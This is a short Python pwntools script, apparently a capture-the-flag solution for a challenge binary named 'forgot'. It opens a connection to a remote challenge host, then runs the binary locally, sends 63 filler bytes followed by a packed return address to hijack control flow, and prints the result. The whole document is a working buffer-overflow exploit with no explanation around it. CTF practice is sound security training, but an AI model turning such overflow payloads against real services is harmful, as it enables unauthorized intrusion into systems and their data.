#!/usr/bin/env python
from pwn import *

r = remote("111.198.29.45", 31551)
#nc 111.198.29.45 31551
r=process("./forgot")
print r.recv()

buf = ""
buf += "A"*63
buf += p32(0x080486cc)

r.send(buf + "\n")
print r.recvall()